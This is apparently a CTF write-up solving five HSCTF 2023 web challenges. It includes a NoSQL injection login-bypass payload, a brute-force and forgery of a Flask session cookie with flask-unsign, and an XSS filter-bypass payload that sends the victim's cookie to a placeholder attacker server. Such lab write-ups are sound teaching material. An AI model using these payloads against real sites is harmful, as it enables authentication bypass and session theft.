---
title: HSCTF 2023 Web writeup
author: 0xRaminf0sec
date: 2023-03-09
categories: [HSCTF]
tags: [web]
---

# HSCTF-2023 challenge writeup

Category - WEB

## Chall 1 → th3-w3bsite

chall link - [https://th3-w3bsite.hsctf.com/](https://th3-w3bsite.hsctf.com/)

Description : 

It's a really simple w3bsite. Nothing much else to say. Be careful though.

**Solution :** 

By seeing the source code , we can able to get the flag .

**`Flag : flag{1434}`**

## Chall 2 → **an-inaccessible-admin-panel**

chall link - [https://login-web-challenge.hsctf.com/](https://login-web-challenge.hsctf.com/)

Description : 

The Joker is on the loose again in Gotham City! Police have found a web application where the Joker had allegedly tampered with. This mysterious web application has login page, but it has been behaving abnormally lately. Some time ago, an admin panel was created, but unfortunately, the password was lost to time. Unless you can find it...

Can you prove that the Joker had tampered with the website?

Default login info: Username: default Password: password123

**Solution :**

By looking the source code , the webpage have login.js file for validating the login.

```jsx
window.onload = function() {
    var loginForm = document.getElementById("loginForm");
    loginForm.addEventListener("submit", function(event) {
        event.preventDefault(); 
    
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
    
        function fii(num){
            return num / 2 + fee(num);
        }
        function fee(num){
            return foo(num * 5, square(num));
        }
        function foo(x, y){
            return x*x + y*y + 2*x*y;
        }
        function square(num){
            return num * num;
        }

        var key = [32421672.5, 160022555, 197009354, 184036413, 165791431.5, 110250050, 203747134.5, 106007665.5, 114618486.5, 1401872, 20702532.5, 1401872, 37896374, 133402552.5, 197009354, 197009354, 148937670, 114618486.5, 1401872, 20702532.5, 160022555, 97891284.5, 184036413, 106007665.5, 128504948, 232440576.5, 4648358, 1401872, 58522542.5, 171714872, 190440057.5, 114618486.5, 197009354, 1401872, 55890618, 128504948, 114618486.5, 1401872, 26071270.5, 190440057.5, 197009354, 97891284.5, 101888885, 148937670, 133402552.5, 190440057.5, 128504948, 114618486.5, 110250050, 1401872, 44036535.5, 184036413, 110250050, 114618486.5, 184036413, 4648358, 1401872, 20702532.5, 160022555, 110250050, 1401872, 26071270.5, 210656255, 114618486.5, 184036413, 232440576.5, 197009354, 128504948, 133402552.5, 160022555, 123743427.5, 1401872, 21958629, 114618486.5, 106007665.5, 165791431.5, 154405530.5, 114618486.5, 190440057.5, 1401872, 23271009.5, 128504948, 97891284.5, 165791431.5, 190440057.5, 1572532.5, 1572532.5];

        function validatePassword(password){
            var encryption = password.split('').map(function(char) {
                return char.charCodeAt(0);
            });
            var checker = [];
            for (var i = 0; i < encryption.length; i++) {
                var a = encryption[i];
                var b = fii(a);
                checker.push(b);
            }
            console.log(checker);
            
            if (key.length !== checker.length) {
                return false;
            }
            
            for (var i = 0; i < key.length; i++) {
                if (key[i] !== checker[i]) {
                    return false;
                }
            }
            return true;
        }

        if (username === "Admin" && validatePassword(password)) {
            alert("Login successful. Redirecting to admin panel...");
            window.location.href = "admin_panel.html";
        }
        else if (username === "default" && password === "password123") {
            var websiteNames = ["Google", "YouTube", "Minecraft", "Discord", "Twitter"];
            var websiteURLs = ["https://www.google.com", "https://www.youtube.com", "https://www.minecraft.net", "https://www.discord.com", "https://www.twitter.com"];
            var randomNum = Math.floor(Math.random() * websiteNames.length);
            alert("Login successful. Redirecting to " + websiteNames[randomNum] + "...");
            window.location.href = websiteURLs[randomNum];
        } else {
            alert("Invalid credentials. Please try again.");
        }
    });
  };
```

So, what actually happening here was, if the username is equals to Admin and the given password is encrypted using above validatepassword() function. 
We have to reverse this process for the key[] array to find a password !!. 
I decided to encrypt all the printable characters using this above logic and match with the key array to find a original key!!.

Here is the script to find a key .

```python
import string

def fii(num):
    return num / 2 + fee(num);

        
def fee(num):
    return foo(num * 5, square(num));

        
def foo(x, y):
    return x * x + y * y + 2 * x * y;

        
def square(num):
    return num * num;

key = [32421672.5, 160022555, 197009354, 184036413, 165791431.5, 110250050, 203747134.5, 106007665.5, 114618486.5, 1401872, 20702532.5, 1401872, 37896374, 133402552.5, 197009354, 197009354, 148937670, 114618486.5, 1401872, 20702532.5, 160022555, 97891284.5, 184036413, 106007665.5, 128504948, 232440576.5, 4648358, 1401872, 58522542.5, 171714872, 190440057.5, 114618486.5, 197009354, 1401872, 55890618, 128504948, 114618486.5, 1401872, 26071270.5, 190440057.5, 197009354, 97891284.5, 101888885, 148937670, 133402552.5, 190440057.5, 128504948, 114618486.5, 110250050, 1401872, 44036535.5, 184036413, 110250050, 114618486.5, 184036413, 4648358, 1401872, 20702532.5, 160022555, 110250050, 1401872, 26071270.5, 210656255, 114618486.5, 184036413, 232440576.5, 197009354, 128504948, 133402552.5, 160022555, 123743427.5, 1401872, 21958629, 114618486.5, 106007665.5, 165791431.5, 154405530.5, 114618486.5, 190440057.5, 1401872, 23271009.5, 128504948, 97891284.5, 165791431.5, 190440057.5, 1572532.5, 1572532.5]

def vaildatepassword(password):

	dec = []

	for i in key:
		for j in string.printable:

			k = i
			a = ord(j)

			b = fii(a)
			if b == k:
				print(chr(a), end="")

			dec.append(b)

	# return enc

vaildatepassword("flag")
```

Here is the decrypted key :

 `Introduce A Little Anarchy, Upset The Established Order, And Everything Becomes Chaos!!`

Using this key , we can able to login and redirected to admin_panel.html

`Flag : flag{Admin , Introduce A Little Anarchy, Upset The Established Order, And Everything Becomes Chaos!!}`

## Chall 3 → **mogodb**

link - [http://mogodb.hsctf.com/](http://mogodb.hsctf.com/)

Description :

The web-scale DB of the future!

**Solution:**

They gave the source code for the challenge , on inspecting [main.py](http://main.py) it has some routes to login and register .

```python
@app.route("/", methods=["POST"])
def login():
	if "user" not in request.form:
		return redirect(url_for("main", error="user not provided"))
	if "password" not in request.form:
		return redirect(url_for("main", error="password not provided"))
	
	try:
		user = db.users.find_one(
			{
			"$where":
				f"this.user === '{request.form['user']}' && this.password === '{request.form['password']}'"
			}
		)
	except pymongo.errors.PyMongoError:
		traceback.print_exc()
		return redirect(url_for("main", error="database error"))
	
	if user is None:
		return redirect(url_for("main", error="invalid credentials"))
	
	session["user"] = user["user"]
	session["admin"] = user["admin"]
	return redirect(url_for("home"))
```

We can see here , the user input directly appends into the query inside single quotes.
SQLi !!!

Here is the payload to bypass the authentication .

`user=admin&password='+||+'1'=='1`

Bypassed !!

`Flag : flag{easier_than_picture_lab_at_least}`

## Chall 4 - **very-secure**

link - [http://very-secure.hsctf.com/](http://very-secure.hsctf.com/)

Description : 

this website is obviously 100% secure

**Solution:**

They gave the source code for this challenge . 

```python
from flask import Flask, render_template, session
import os
app = Flask(__name__)
SECRET_KEY = os.urandom(2)
app.config['SECRET_KEY'] = SECRET_KEY
FLAG = open("flag.txt", "r").read()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/flag')
def get_flag():
    if "name" not in session:
        session['name'] = "user"
    is_admin = session['name'] == "admin"
    return render_template("flag.html", flag=FLAG, admin = is_admin)

if __name__ == '__main__':
    app.run()
```

on inspecting the [app.py](http://app.py) , we can see the SECRET_KEY is the random of length 2 bytes!!

So , we can able to bruteforce the SECRET_KEY easily!!

For that we have to generate the random bytes length of 300.

```python
f= open("bytes.txt",'a+')
for i in range(300):
	for j in range(300):
		f.write(f'{chr(i)}{chr(j)}\n')
```

Using flask-unsign we can able to bruteforce the secret_key

```python
flask-unsign --wordlist ~/Desktop/bytes.txt --unsign --cookie 'eyJuYW1lIjoidXNlciJ9.ZH7Xnw.QP8s7mNoNvwInGLDBN3fgw46Zuk' --no-literal-eval
[*] Session decodes to: {'name': 'user'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 34816 attempts
b'p6'
```

‘p6’ is the secret key used!!.

Now , we have to sign the token using this secretkey

```python
flask-unsign --sign --cookie "{'name': 'admin'}" --secret 'p6'

eyJuYW1lIjoiYWRtaW4ifQ.ZH7d-w.YF2iU4MpkmE9CXkCE8lIGenZ_Pc
```

So using this token , we can able to get the flag !!.

## Chall 5 →**fancy-page**

link : [http://fancy-page.hsctf.com/](http://fancy-page.hsctf.com/)

Description : hmmm

**Solution:**

In this webpage , we can able to create a content and send that content to the admin bot.

So, if we popup XSS , we can able to steal any info from the admin bot!!.

They gave the source code of the challenge.

```jsx
import { default as Arg } from "https://cdn.jsdelivr.net/npm/@vunamhung/arg.js@1.4.0/+esm";

function sanitize(content) {
	return content.replace(/script|on|iframe|object|embed|cookie/gi, "");
}

let title = document.getElementById("title");
let content = document.getElementById("content");

function display() {
	title.textContent = Arg("title");
	document.title = Arg("title");

	let sanitized = sanitize(Arg("content"));
	content.innerHTML = sanitized;

	document.body.style.backgroundColor = Arg("background_color");
	document.body.style.color = Arg("color");
	document.body.style.fontFamily = Arg("font");
	content.style.fontSize = Arg("font_size") + "px";
}

display();
```

On inspecting the display.js , it replaces the script,on,iframe,object,embed,cookie elements to “”.

so, what if we give the input like scrscriptipt. It removes the script string inside that string and it became again script !!.

So, the actual payload is 

```jsx
<img src=x oonnerror=this.src='http://yourserver/?'+document.coocookiekie;>
```

submit the created content url to the bot server.!!

Here is the flag :
`flag{filter_fail}`